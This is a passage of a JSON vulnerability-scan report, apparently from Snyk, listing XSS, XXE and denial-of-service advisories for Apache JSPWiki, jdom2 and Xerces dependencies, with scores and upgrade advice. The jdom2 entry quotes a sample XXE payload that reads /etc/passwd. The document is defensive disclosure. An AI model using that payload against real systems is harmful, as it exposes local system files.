      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-2971023",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
      "credit": [
        "Wang Ran"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.3)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-28732",
          "title": "Apache Advisory"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/c5ff7ab6056dfb938371b974b478b629ed3415d9",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-08-11T01:10:54.103009Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `execute()` function in `WeblogPlugin.java`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.3 or higher.\n## References\n- [Apache Advisory](https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-28732)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/c5ff7ab6056dfb938371b974b478b629ed3415d9)\n",
      "epssDetails": {
        "percentile": "0.68316",
        "probability": "0.00360",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-28732"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2022-08-04T12:18:53.068234Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-08-04T12:14:56Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2022-08-04T13:28:05.800920Z",
      "modificationTime": "2022-08-11T01:10:54.103009Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-5603190",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      "credit": [
        "Eugene Lim",
        "Sng Jay Kai"
      ],
      "semver": {
        "vulnerable": [
          "[,2.12.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-46907",
          "title": "Advisory"
        },
        {
          "url": "https://lists.apache.org/thread/1m0mkq2nttx8tn94m11mytn4f0tv1504",
          "title": "Apache Lists"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/0b9a0149032170063f22d65e335dfd317db815ea",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/46e1ef7a595ca5cabf5ef184139910413f2024fc",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/484c6a133e397693991b7c9a9b62ef3ca48ce707",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/75019d337f1d0033b1f65428e75f43baeffd99dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/82be08904a6d8bd22fa2d4e5a7e85f43408724d3",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/9d6dbf911d52d724297e4e46c4b80649fb028ff9",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/df20770f251a8d7431047e556b144ef24ee6a3a7",
          "title": "GitHub Commit"
        },
        {
          "url": "http://www.openwall.com/lists/oss-security/2023/05/25/1",
          "title": "OSS Security Advisory"
        },
        {
          "url": "https://github.com/apache/jspwiki/blob/37bf55373ed5a739a388a720163cf51d1104537f/ChangeLog.md?plain=1%23L112",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-06-01T13:10:18.487730Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization. A carefully crafted request on several JSPWiki plugins could trigger an XSS vulnerability on Apache JSPWiki, which could allow the attacker to execute javascript in the victim's browser and get some sensitive information about the victim.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.12.0 or higher.\n## References\n- [Advisory](https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-46907)\n- [Apache Lists](https://lists.apache.org/thread/1m0mkq2nttx8tn94m11mytn4f0tv1504)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/0b9a0149032170063f22d65e335dfd317db815ea)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/46e1ef7a595ca5cabf5ef184139910413f2024fc)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/484c6a133e397693991b7c9a9b62ef3ca48ce707)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/75019d337f1d0033b1f65428e75f43baeffd99dd)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/82be08904a6d8bd22fa2d4e5a7e85f43408724d3)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/9d6dbf911d52d724297e4e46c4b80649fb028ff9)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/df20770f251a8d7431047e556b144ef24ee6a3a7)\n- [OSS Security Advisory](http://www.openwall.com/lists/oss-security/2023/05/25/1)\n- [Vulnerable Code](https://github.com/apache/jspwiki/blob/37bf55373ed5a739a388a720163cf51d1104537f/ChangeLog.md?plain=1#L112)\n",
      "epssDetails": {
        "percentile": "0.62570",
        "probability": "0.00261",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-46907"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-qvq8-cw7f-m7m4"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2023-05-26T08:16:35.313998Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-05-25T09:30:25Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2023-05-26T08:16:35.297164Z",
      "modificationTime": "2023-06-01T13:10:18.487730Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.12.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGJDOM-1309669",
      "title": "XML External Entity (XXE) Injection",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Esti Burstein of Aleph Research HCL Technologies"
      ],
      "semver": {
        "vulnerable": [
          "[0,2.0.6.1)"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.6.1"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.jdom:jdom2",
      "references": [
        {
          "url": "https://github.com/hunterhacker/jdom/pull/188",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/hunterhacker/jdom/releases/tag/JDOM-2.0.6.1",
          "title": "GitHub Release"
        },
        {
          "url": "https://alephsecurity.com/vulns/aleph-2021003",
          "title": "Security Advisory (with PoC)"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-07-26T01:11:26.422403Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-10-25T23:28:18.231601Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-10-26T11:16:07.306247Z"
        }
      ],
      "description": "## Overview\n[org.jdom:jdom2](https://github.com/hunterhacker/jdom) is a Java manipulation of XML made easy.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection via a crafted HTTP request.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `org.jdom:jdom2` to version 2.0.6.1 or higher.\n## References\n- [GitHub PR](https://github.com/hunterhacker/jdom/pull/188)\n- [GitHub Release](https://github.com/hunterhacker/jdom/releases/tag/JDOM-2.0.6.1)\n- [Security Advisory (with PoC)](https://alephsecurity.com/vulns/aleph-2021003)\n",
      "epssDetails": {
        "percentile": "0.58420",
        "probability": "0.00216",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2021-33813"
        ],
        "CWE": [
          "CWE-611"
        ]
      },
      "packageName": "org.jdom:jdom2",
      "proprietary": false,
      "creationTime": "2021-06-16T13:22:35.092359Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2021-06-16T13:06:23Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.jdom",
        "artifactId": "jdom2"
      },
      "publicationTime": "2021-06-16T16:06:06Z",
      "modificationTime": "2022-10-26T11:16:07.306247Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "org.jdom:jdom2@2.0.5"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.jdom:jdom2",
      "version": "2.0.5"
    },
    {
      "id": "SNYK-JAVA-XERCES-2359991",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Sergey Temnikov",
        "Ziyi Luo"
      ],
      "semver": {
        "vulnerable": [
          "[0,2.12.2)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://lists.apache.org/thread/6pjwm10bb69kq955fzr1n0nflnjd27dl",
          "title": "Apache Pony Mail"
        },
        {
          "url": "https://svn.apache.org/viewvc?view=revision&revision=1897143",
          "title": "Fix Revision"
        },
        {
          "url": "https://markmail.org/message/vcmhwbuorfgcdr6l",
          "title": "MarkMail"
        },
        {
          "url": "https://xerces.apache.org/xerces2-j/releases.html",
          "title": "Release Notes"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-05-11T11:26:36.684848Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2022-10-29T01:10:37.776047Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2022-10-26T00:42:14.827883Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) via the XML parser when handling specially crafted XML document payloads. When the parser tries to parse such a document it gets stuck in an infinite loop for a long time, which consumes resources.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.12.2 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/6pjwm10bb69kq955fzr1n0nflnjd27dl)\n- [Fix Revision](https://svn.apache.org/viewvc?view=revision&revision=1897143)\n- [MarkMail](https://markmail.org/message/vcmhwbuorfgcdr6l)\n- [Release Notes](https://xerces.apache.org/xerces2-j/releases.html)\n",
      "epssDetails": {
        "percentile": "0.72280",
        "probability": "0.00474",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23437"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2022-01-25T13:09:32.813975Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-25T12:51:04Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2022-01-25T17:40:01.032114Z",
      "modificationTime": "2022-10-29T01:10:37.776047Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22",
        "xerces:xercesImpl@2.11.0"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.11.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-30183",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0.SP5)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.0.SP5"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "http://svn.apache.org/viewvc?view=revision&revision=1499506",
          "title": "Apache-SVN"
        },
        {
          "url": "https://bugzilla.redhat.com/CVE-2013-4002",
          "title": "Redhat Bugzilla"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2023-02-09T11:24:02.781225Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-02-09T11:24:55.164799Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) which is caused by the way the JRE processes XML files. A remote attacker could use this flaw to supply crafted XML that would lead to a denial of service.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.11.0.SP5 or higher.\n## References\n- [Apache-SVN](http://svn.apache.org/viewvc?view=revision&revision=1499506)\n- [Redhat Bugzilla](https://bugzilla.redhat.com/CVE-2013-4002)\n",
      "epssDetails": {
        "percentile": "0.82442",
        "probability": "0.01104",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2013-4002"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:49Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2013-07-23T11:03:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2013-10-15T16:51:49Z",
      "modificationTime": "2023-02-09T11:24:55.164799Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22",
        "xerces:xercesImpl@2.11.0"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.11.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-31585",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Juraj Somorovsky"
      ],
      "semver": {
        "vulnerable": [
          "[0,2.12.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [
        {
          "version": [
            "[2.6.2,2.12.0)"
          ],
          "functionId": {
            "filePath": "org/apache/xerces/util/XMLAttributesImpl.java",
            "className": "XMLAttributesImpl",
            "functionName": "addAttribute"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://github.com/apache/xerces2-j/commit/992b5d9c24102ad20330d36c0a71162753a37449",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/XERCESJ-1685?jql=project%20%3D%20XERCESJ",
          "title": "Jira Issue"
        },
        {
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0881",
          "title": "NVD"
        },
        {
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=787104",
          "title": "RedHat Bugzilla Bug"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-01-03T17:22:51.488507Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-02-09T11:25:01.854327Z"
        }
      ],
      "description": "## Overview\n\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\n\nAffected versions of this package are vulnerable to Denial of Service (DoS).\nApache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions.\n\n## Remediation\n\nUpgrade `xerces:xercesImpl` to version 2.12.0 or higher.\n\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\n\n## References\n\n- [GitHub Commit](https://github.com/apache/xerces2-j/commit/992b5d9c24102ad20330d36c0a71162753a37449)\n\n- [Jira Issue](https://issues.apache.org/jira/browse/XERCESJ-1685?jql=project%20%3D%20XERCESJ)\n\n- 